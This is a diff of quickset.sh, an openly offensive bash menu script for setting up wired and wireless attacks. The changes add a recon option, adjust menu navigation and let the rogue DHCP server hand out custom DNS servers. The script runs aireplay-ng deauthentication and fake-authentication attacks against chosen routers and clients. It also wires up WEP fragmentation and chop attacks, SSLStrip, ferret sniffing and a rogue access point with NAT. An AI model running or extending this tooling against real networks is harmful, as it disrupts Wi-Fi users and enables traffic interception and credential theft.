@@ -3,7 +3,7 @@ function head()
 {
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 ## Filename: quickset.sh
-## Version: 0.3.1
+## Version: 0.3.3
 ## Copyright (C) <2009>  <Snafu>
 
 ##  This program is free software: you can redistribute it and/or modify
@@ -58,9 +58,8 @@ function head()
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Requested Help ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 ## How can I kill the function loop issue?  A function always wants to finish, even if called off to another function...Useful, but how to kill;  return should work possibly??
 
-## Would like to figure out how to echo the last command issued
-## Simple hack is history | tail -n 2 | head -n 1
-## Need to figure how to "Awk Out" things... [^abc] negates abc..but how to implement....
+## Last command issued below.  Now to find how to make it show the value of the variables.....
+## history | tail -n 2 | head -n 1 | awk '{$1=""; print $0}'
 
 ## WOULD LIKE TO IMPLEMENT MORE FAST ACTING ATTACK TOOLS THAT REQUIRE LITTLE TO NO SETUP.  If you have a tool you would like added to this script please contact me
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
@@ -76,7 +75,14 @@ function head()
 ### Figure out if old PIDs are used during a cycle...if not we'll do PID assignments to ensure kill -9s
 ### Use PIDs to make a greppable list
 
-### Sanitize available devices?
+### Sanitize available devices via
+# ifconfig -s | awk '{print $1}' | grep -v Iface > dev_list
+# echo "make input"
+# read x
+# grep -i $x dev_list > /dev/null
+# if [ $? -ne 0 ];then
+# 	echo "You made bad choice"
+# fi
 
 ### Find out why the leases look this way /var/lib/dhcp3/dhcpd.leases
 ###  lease 192.168.10.100 {
@@ -85,8 +91,6 @@ function head()
 ###  cltt 4 2011/10/06 19:01:58;
 ###  binding state active;
 ###  next binding state free;
-
-### Remove the needlessness of a var= for some while loops
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -119,7 +123,6 @@ function head()
 
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~ Planned Implementations ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
-## Custom DNS Entries for DHCP Server
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -166,7 +169,6 @@ read
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 init_setup--()
 {
-kill_mon= ## Nulled
 clear
 echo -e "\033[1;32m\n--------------------------------------------------------------------------------------
          Only Certain Modes in this Script Require Both Devices to be Defined
@@ -192,12 +194,12 @@ echo -e "\033[1;32m\n-----------------------------------------------------------
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 read init_var
 case $init_var in
-	1) var=x
+	1) mon_live=x
 	echo -e "\033[36m\nDefine NIC"
 	read pre_pii
 	init_setup--;;
 
-	2) if [[ $var != x ]]; then
+	2) if [[ $mon_live != x ]]; then
 		echo -e "\033[31mYOU MUST DEFINE THE WIRELESS NIC FIRST"
 		read
 		init_setup--
@@ -249,6 +251,7 @@ echo -e "\033[31m\n
 		echo -e "\033[36m\nMonitor Mode Device to Kill?"
 		read KM
 	done
+
 	while [ -z $var ];do
 		echo -e "\033[36m\nIs \033[1;33m$KM\033[36m associated with a Physical Device? (y or n)"
 		read var
@@ -266,6 +269,7 @@ echo -e "\033[31m\n
 			*) var=
 		esac
 	done
+
 	echo -e "\n\n\033[1;32mPress Enter to Continue"
 	read
 else
@@ -276,11 +280,9 @@ else
 		echo -e "\033[36m\nDevice Name Assigned for Monitor Mode on \033[1;33m$pre_pii\033[36m?\n(i.e.  mon0, mon1, mon2?, etc....)"
 		read var
 	done
+
 	pii=$var
 fi
-
-## The below variable is kinda useless I believe, I noticed it during the Random MAC creation of this script.  I put it in the top of this script for some reason, but that eludes me now.  If found to be useless, please let me know to remove it and save a line.
-var= ## Nulled
 }
 
 nics--()
@@ -344,6 +346,7 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 				echo -e "\033[36m\nMonitor Mode NIC name?"
 				read mac_devII
 			done
+
 			ifconfig $mac_dev down
 			ifconfig $mac_devII down
 			clear
@@ -482,7 +485,7 @@ echo -e "\033[1;34m\n\n\n\n\n\n\n
 QuickSet - A Quick Way to Setup a Wired/Wireless Hack
       Author: Snafu ----> will@configitnow.com
            Read Comments Prior to Usage
-           Version 0.3.1 (7 October 2011)\033[1;33m
+           Version 0.3.3 (11 October 2011)\033[1;33m
 
 
         IP Forwarding via the Kernel Enabled
@@ -504,6 +507,7 @@ echo -e "\033[1;32m\nUsage: ./quickset.sh"
 
 main_menu--()
 {
+# scan_var= ## Variable for determining where Wireless Channel Recon was called from
 trap cleanup-- INT
 clear
 echo -e "\033[1;34m
@@ -527,7 +531,8 @@ read var
 case $var in
 	1) setups--;;
 
-	2) sc=1-11 ## Channels to scan on
+	2) scan_var=main 
+	sc=1-11 ## Channels to scan on
 	hop=1500 ## time between channel hops
 	scan--;;
 
@@ -736,6 +741,7 @@ case $rte_choice in
 	if [[ $ap_check != x ]]; then
 		ap_pre_var--
 	fi
+
 	dhcp_svr--;;
 
 	6) main_menu--;;
@@ -753,6 +759,7 @@ case $var in
 		killall dhcpd3
 	fi;;
 esac
+
 exit
 }
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
@@ -826,7 +833,12 @@ echo -e "\033[36m\nWould you like to DeAuth to reveal hidden ESSIDS? (y or n)"
 read var
 case $var in
 	y|Y) deauth--;;
-	n|N) main_menu--;;
+
+	n|N) case $scan_var in
+		main) main_menu--;;
+		wifi) venue--;;
+	esac;;
+
 	*) rescan--;;
 esac
 }
@@ -886,9 +898,14 @@ rb= ## Router BSSID
 			deauth_II--;;
 
 			s|S) switch_deauth--;;
-			e|E) main_menu--;; 
+
+			e|E) case $scan_var in
+				main) main_menu--;;
+				wifi) venue--;;
+			esac;; 
+
 			*) deauth_III--;;
-			esac
+		esac
 		}
 
 	while [ -z $dt ];do
@@ -906,12 +923,18 @@ rb= ## Router BSSID
 			echo -e "\033[36m\nClient MAC address?"
 			read cm
 		done
+
 		echo -e "\033[1;33m"
 		aireplay-ng $pii -0 4 -a $rb -c $cm
 		deauth_III--;;
 
 		s|S) switch_deauth--;;
-		e|E) main_menu--;;
+
+		e|E) case $scan_var in
+			main) main_menu--;;
+			wifi) venue--;;
+		esac;;
+
 		*) deauth_II--;;
 	esac
 	}
@@ -983,6 +1006,7 @@ ferret--()
 			*) fer_type=Wireless
 			wifi_check=x;;
 		esac
+
 		ferret_II--;;
 
 		4) atk_menu--;;
@@ -1001,6 +1025,7 @@ ferret--()
 					1|2|3|4|5|6|7|8|9|10|11) ;;
 					*) fer_chan=6 ;;
 				esac
+
 				xterm -bg black -fg grey -sb -rightbar -title Ferret -e ferret -i $fer_dev --channel $fer_chan & 
 				atk_menu--;;
 
@@ -1106,6 +1131,7 @@ ssl_tail=Yes ## SSLStrip Tail Log
 			3) log_opt="-a" ;;
  			*) log_opt="-p" ;;
 		esac
+
 		strip_em_II--;;
 
 		4) lck_fav= ## Nulled
@@ -1118,6 +1144,7 @@ ssl_tail=Yes ## SSLStrip Tail Log
 				*) lck_fav= ;;
 			esac
 		done
+
 		strip_em_II--;;
 
 		5) ses_kil= ## Nulled
@@ -1130,6 +1157,7 @@ ssl_tail=Yes ## SSLStrip Tail Log
 				*) ses_kil= ;;
 			esac
 		done
+
 		strip_em_II--;;
 
 		6) ssl_tail= ## Nulled
@@ -1142,6 +1170,7 @@ ssl_tail=Yes ## SSLStrip Tail Log
 				*) ssl_tail= ;;
 			esac
 		done
+
 		strip_em_II--;;
 
 		7) atk_menu--;;
@@ -1243,7 +1272,7 @@ dhcp_dev=at0 ## Device to setup DHCP server on
 sas=192.168.10.0 ## DHCP Subnet 
 sair="192.168.10.100 192.168.10.200" ## DHCP IP range
 dhcp_tail=Yes ## DHCP Tail Log
-dhcp_check=x ## Not sure if I need this, leaving for now
+dns_cus=No
 }
 
 dhcp_svr--()
@@ -1254,6 +1283,17 @@ DHCPDCONF="/tmp/dhcpd.conf" ## Used by dhcpd3
 
 	dhcp_func--()
 	{
+
+		custom_dns--()
+		{
+		while [ "$1" != "" ];do
+			for sadns in $1;do
+				echo "option domain-name-servers $sadns;" >> /tmp/dhcpd.conf
+			done
+			shift
+		done
+		}
+
 	clear
 	echo -e "\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -1271,9 +1311,11 @@ DO NOT USE [\033[1;33m`route -n | awk '/UG/ { print $2 }'`\033[31m] FOR THE GATE
 
 5) IP Range            [\033[1;33m$sair\033[36m]
 
-6) Tail DHCP Log       [\033[1;33m$dhcp_tail\033[36m]
+6) Custom DNS Entries  [\033[1;33m$sair\033[36m]
 
-7) Proceed\033[1;34m
+7) Tail DHCP Log       [\033[1;33m$dhcp_tail\033[36m]
+
+8) Proceed\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 	read var
 	case $var in
@@ -1307,9 +1349,28 @@ DO NOT USE [\033[1;33m`route -n | awk '/UG/ { print $2 }'`\033[31m] FOR THE GATE
 				*) dhcp_tail= ;;
 			esac
 		done
+
 		dhcp_func--;;
 
-		7) if [[ -z $dhcp_dev || -z $sapip || -z $sasm || -z $sas || -z $sair ]];then
+		7) dns_cus= ## Nulled
+		while [ -z $dns_cus ];do
+			echo -e "\033[36mCreate Custom DNS Entries? (y or n)"
+			read dns_cus
+			case $dns_cus in
+				y|Y) dhcp_tail=Yes 
+				echo -e "\033[1;32mEnter the desired IP Addressess of the DNS seperated by a space
+i.e.~~~~~>> 192.168.1.1 192.168.1.2 192.168.1.3\n"
+				read dns_entry ;;
+
+				n|N) dns_cus=No ;;
+
+				*) dns_cus= ;;
+			esac
+		done
+
+		dhcp_func--;;
+
+		8) if [[ -z $dhcp_dev || -z $sapip || -z $sasm || -z $sas || -z $sair || -z $dhcp_tail || -z $dns_cus ]];then
 			echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
 			read
 			dhcp_func--
@@ -1335,9 +1396,13 @@ DO NOT USE [\033[1;33m`route -n | awk '/UG/ { print $2 }'`\033[31m] FOR THE GATE
 ## Old messy way of doing things
 # 	for sadns in $(cat /etc/resolv.conf | sed -r 's/^.* ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*$/\1/' | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}');do
 ## Cleaner way of doing things
-	for sadns in $(grep nameserver /etc/resolv.conf | awk '{print $2}');do
-		echo "option domain-name-servers $sadns;" >> /tmp/dhcpd.conf
-	done
+	if [[ $dns_cus = No ]];then
+		for sadns in $(grep nameserver /etc/resolv.conf | awk '{print $2}');do
+			echo "option domain-name-servers $sadns;" >> /tmp/dhcpd.conf
+		done
+	else
+		custom_dns-- $dns_entry
+	fi
 
 	echo "}"  >> /tmp/dhcpd.conf
 	}
@@ -1362,9 +1427,11 @@ DO NOT USE [\033[1;33m`route -n | awk '/UG/ { print $2 }'`\033[31m] FOR THE GATE
 
 			4) iptables -t nat -A POSTROUTING -o $IE -j MASQUERADE;;
 		esac
+
 		case $dhcp_tail in
 			Yes) xterm -bg black -fg grey -sb -rightbar -title "DHCP Server Tail" -e tail -f /var/lib/dhcp3/dhcpd.leases & ;;
 		esac
+
 		echo -e "\033[1;33m\n\n\n\nDHCP server started succesfully\n\n"
 		sleep 3
 		echo -e "\033[1;32m\n\n\n\nPress Enter to Return to Routing Features"
@@ -1472,6 +1539,7 @@ case $var in
 		1|2|3|4|5|6|7|8|9|10|11) ;;
 		*) sac=6 ;;
 	esac
+
 	ap_setup--;;
 
 	5) echo -e "\033[36mDesired MTU Size?"
@@ -1488,6 +1556,7 @@ case $var in
 			*) dhcp_autol= ;;
  		esac
 	done
+
 	ap_setup--;;
 
 	7) if [[ -z $pre_pii || -z $sapip || -z $sasm || -z $sac || -z $mtu_size || -z $dhcp_autol ]];then
@@ -1762,6 +1831,7 @@ YOU HAVE KILLED OFF THE ORIGINAL AIRODUMP-NG XTERM SESSION
 			echo -e "\033[36m\nEnter Hidden ESSID"
 			read hid_essid
 		done
+
 		xterm -bg black -fg grey -sb -rightbar -title "Fake Auth" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -e "$hid_essid" & ;;
 	
 		n|N) xterm -bg black -fg grey -sb -rightbar -title "Fake Auth" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm & ;;
@@ -1778,20 +1848,31 @@ YOU HAVE KILLED OFF THE ORIGINAL AIRODUMP-NG XTERM SESSION
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             --WiFi 101 Venue Selection--
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
-1) Router-Based WEP Attacks
+1) Wireless Channel Recon
 
-2) Client-Based WEP Attacks
+2) Router-Based WEP Attacks
 
-3) WPA Attacks (THIS DOES NOT INVOKE AIRCRACK-NG)
+3) Client-Based WEP Attacks
 
-4) Return to Main Menu\033[1;34m
+4) WPA Attacks (THIS DOES NOT INVOKE AIRCRACK-NG)
+
+5) Return to Main Menu\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 	read var
 	case $var in
-		1) rtech--;;
-		2) ctech--;;
-		3) WPA--;;
-		4) main_menu--;;
+		1) scan_var=wifi 
+		sc=1-11 ## Channels to scan on
+		hop=1500 ## time between channel hops
+		scan--;;
+
+		2) rtech--;;
+
+		3) ctech--;;
+
+		4) WPA--;;
+
+		5) main_menu--;;
+
 		*) venue--;;
 	esac
 	}
@@ -1897,7 +1978,7 @@ Client Technique Selection
 		done;;
 
 		4|5|6) spec=2
-		all_probe='-P -C 60' ;;
+		all_probe='-P -C 60';;
 
 		*) WPA--;;
 	esac
@@ -1965,6 +2046,7 @@ Client Technique Selection
 		if [ $rppb -gt 1000 ];then
 			rppb=1000
 		fi
+
 		rtech_II--;;
 
 		7) if [[ -z $b || -z $sm || -z $rd || -z $ppb || -z $kaf || -z $rppb ]];then
@@ -2115,6 +2197,7 @@ Client Technique Selection
 
 					*) amplify_III
 				esac
+
 				rec_atk="1) Fragmentation Attack"
 				amp_null--
 				amplify_II--;;
@@ -2136,6 +2219,7 @@ Client Technique Selection
 
 					*) amplify_III--;;
 				esac
+
 				rec_atk="2) Chop Attack"
 				amp_null--
 				amplify_II--;;
@@ -2325,10 +2409,11 @@ if [ "$UID" -ne 0 ];then
 fi
 
 if [ -z $1  ]; then
-	var= ## Multiple Use Variable to conserve use of different variable names
 	IE= ## Internet Connected NIC
 	pre_pii= ##
 	pii= ## Dual mode variable, can be monitormode variable, or device to be assigned to monitor mode
+	kill_mon= ## Nulled
+	mon_live= ## Nulled
 	greet--
 else
 	usage--
